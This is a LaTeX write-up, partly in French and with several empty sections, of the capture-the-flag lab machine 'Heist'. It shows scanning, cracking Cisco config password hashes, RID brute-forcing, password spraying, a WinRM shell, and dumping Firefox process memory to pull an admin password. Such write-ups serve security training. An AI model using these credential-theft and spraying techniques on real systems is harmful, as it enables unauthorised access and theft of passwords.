\chapter{Heist}
\begin{itemize}
    \item {\bf technics}: rid bruteforce, process dump
    \item {\bf Components}: ms-rpc, firefox
    \item {\bf tools}: rpcclient, procdump, strings
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX heist.nmap 10.10.10.149
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 05:39 CEST
NSOCK ERROR [61.1320s] mksock_bind_addr(): Bind to 0.0.0.0:874 failed (IOD #55): Address already in use (98)
Nmap scan report for 10.10.10.149
Host is up (0.036s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-09-27T03:40:14
|_  start_date: N/A

$ sudo nmap -p- -sV -sC -oX heist.nmap 10.10.10.149                                                                                                        
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 05:41 CEST
Nmap scan report for 10.10.10.149
Host is up (0.031s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-09-27T03:44:36
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message
\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
NetBIOS computer name: SUPPORTDESK
NetBIOS domain name: ''
DNS domain: SupportDesk
FQDN: SupportDesk
Derived membership: workgroup member
Derived domain: unknown

OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'

\end{verbatim}

\subsubsection{http}

login as guest. On a hazard et support admin(admin)
il demande un compte.
on a un fichier de config

\begin{verbatim}
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
\end{verbatim}

avec ffuf on voit des trucs notamment
\begin{verbatim}
Attachments             [Status: 301, Size: 155, Words: 9, Lines: 2, Duration: 28ms]
\end{verbatim}

\begin{verbatim}
http://10.10.10.149/attachments/config.txt
\end{verbatim}

Sqlmap ne donne rien

\href{https://davidbombal.com/cisco-type-7-password-decryption/}{Cisco Type 7
Password Decryption}
\begin{verbatim}
0242114B0E143F015F5D1E161713 -> $uperP@ssword
02375012182C1A1D751618034F36415408 -> Q4)sJu\Y8qz*A3?d

$ echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' | hashid
Analyzing '$1$pdQG$o8nrSzsGXeaduXrjlvKc91'
[+] MD5 Crypt
[+] Cisco-IOS(MD5)
[+] FreeBSD MD5

$ john --show  hash.text
?:stealth1agent
\end{verbatim}


\begin{verbatim}
$ rpcclient -U 'hazard%stealth1agent' 10.10.10.149
Can't load /etc/samba/smb.conf - run testparm to debug it

> getusername
Account Name: Hazard, Authority Name: SUPPORTDESK
\end{verbatim}

\begin{verbatim}

$ evil-winrm  -i 10.10.10.149 -u hazard -p stealth1agent
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
\end{verbatim}


\begin{verbatim}
$ crackmapexec smb 10.10.10.149 -u hazard -p stealth1agent --rid-brute
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent
SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
\end{verbatim}

\begin{verbatim}
$ crackmapexec smb 10.10.10.149 -u /tmp/localusers -p /tmp/passwds --continue-on-success
SMB  10.10.10.149    445    SUPPORTDESK   [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Administrator:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Administrator:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Guest:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Guest:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Guest:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\DefaultAccount:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\DefaultAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\DefaultAccount:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\WDAGUtilityAccount:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\WDAGUtilityAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\WDAGUtilityAccount:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\None:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\None:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\None:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Hazard:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [+] SupportDesk\Hazard:stealth1agent
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Chase:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Chase:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Jason:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\Jason:stealth1agent STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\:$uperP@ssword STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE
SMB  10.10.10.149    445    SUPPORTDESK   [-] SupportDesk\:stealth1agent STATUS_LOGON_FAILURE
\end{verbatim}


\begin{verbatim}
$ evil-winrm -i 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d'
fatal: not a git repository (or any of the parent directories): .git

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents>
\end{verbatim}


\subsection{Privesc}
\subsubsection{Enum}
\begin{verbatim}
*Evil-WinRM* PS C:\Users\Chase\Documents> ls "C:/Program Files"

d-----        2/18/2021   4:21 PM                Mozilla Firefox
\end{verbatim}

\begin{verbatim}
> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    475      17     2300       5472               364   0 csrss
    291      13     2316       5256               476   1 csrss
    360      15     3564      14816              4620   1 ctfmon
    253      14     3932      13380              3560   0 dllhost
    166       9     1884       9780       0.05   3948   1 dllhost
    615      32    29640      57384               964   1 dwm
   1491      58    23552      78824              4876   1 explorer
   1065      76   187604     264484      10.06   4940   1 firefox
    401      36    49556     108456       2.80   5568   1 firefox
    347      19    11024      36800       0.09   5844   1 firefox
    378      29    30852      68008       1.78   6304   1 firefox
    355      25    16556      39176       0.39   6768   1 firefox
\end{verbatim}

\begin{verbatim}
Get-Process |
    where {$_.SI -eq (Get-Process -PID $PID).SessionId} |
    where {$_.ProcessName -eq 'firefox'}
\end{verbatim}
les firefox ne sont pa à nous mais on ne sait pas a qui.

\begin{verbatim}
 upload SysinternalsSuite/procdump64.exe .
 upload SysinternalsSuite/strings64.exe .

*Evil-WinRM* PS C:\Users\Chase\Documents> ./procdump64.exe 704 -accepteula 

 .\strings64.exe firefox.exe_220928_093953.dmp -accepteula |findstr 'password'

MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=

\end{verbatim}


\subsubsection{nmap}
\begin{verbatim}

\end{verbatim}


\subsubsection{nmap}
\begin{verbatim}

\end{verbatim}


\section{Theorie}


